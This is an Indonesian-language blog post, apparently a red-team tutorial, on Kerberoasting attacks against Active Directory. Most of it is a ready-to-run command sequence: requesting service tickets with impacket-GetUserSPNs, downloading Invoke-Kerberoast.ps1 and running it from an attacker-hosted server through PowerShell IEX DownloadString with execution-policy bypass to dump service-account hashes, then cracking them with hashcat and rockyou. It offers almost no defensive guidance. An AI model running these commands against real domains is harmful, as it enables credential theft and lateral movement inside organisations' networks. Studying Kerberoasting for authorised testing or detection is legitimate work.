---
title: Kerberoasting Attack!
author: "novran"
date: 2024-11-22 00:00:00 +0700
categories: [Active Directory Pentest]
tags: [Active Directory Pentest, Red Team]
mermaid: true
image:
  path: /images/2024-11-22-kerberoasting-like-a-boss.png
  alt: Kerberoasting
---

Kerberoasting adalah sebuah **teknik serangan pada jaringan Active Directory** yang _memanfaatkan kelemahan protokol Kerberos_. Dalam serangan ini, penyerang yang sudah berhasil memiliki akses tidak sah ke akun domain (pengguna biasa dengan privilege rendah) dapat meminta **Ticket-Granting Service (TGS)** untuk layanan tertentu, seperti Database (MSSQL) atau Web Server (IIS).

Tiket TGS ini berisi Hash (yang mengandung password) milik akun layanan (Service Account) tersebut. Penyerang kemudian dapat mengekstrak Hash-nya dan mencoba memecahkannya secara **Offline** menggunakan metode **Brute Force** untuk mendapatkan kata sandi aslinya.

Jika berhasil, penyerang dapat menggunakan akun layanan tersebut untuk melakukan **Lateral Movement** atau berpindah akses dari satu akun ke akun lainnya, misalnya dari akun pengguna biasa `john.doe` ke akun layanan seperti `sql_svc`. Hal ini membuka jalan baru bagi penyerang untuk meningkatkan akses dan bertindak lebih jauh lagi.

## 1. Steal the Ticket

### Remote Execution

```bash
impacket-GetUserSPNs <domain>/<username>:<password> -request -dc-ip <ip domain controller>
```

### Local Execution via Compromised Machine

Di tutorial ini saya menggunakan [Invoke-Kerberoast.ps1](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1) untuk memperoleh tiket.

```bash
wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
```

```bash
python3 -m http.server 80
```

**Mengeksekusi di local**

```powershell
iwr -uri http://<ATTACKER_MACHINE>/Invoke-Kerberoast.ps1 -outfile Invoke-Kerberoast.ps1
```

```powershell
powershell -ep bypass
. .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat HashCat | Select-Object -ExpandProperty hash
```

**Mengeksekusi menggunakan Invoke Expression**

```powershell
## PowerShell
IEX (New-Object System.Net.WebClient).DownloadString('http://<ATTACKER_MACHINE>/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat HashCat | Select-Object -ExpandProperty hash

## CMD
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://<ATTACKER_MACHINE>/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat HashCat | Select-Object -ExpandProperty hash"
```

## 2. Crack the Ticket

Simpan semua hash yang berhasil diperoleh ke sebuah file (sebagai contoh di sini menggunakan nama file `kerberoast.hashes`).

```bash
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
```

![Hashcat](/images/2024-11-22-kerberoasting-hashcat.png)
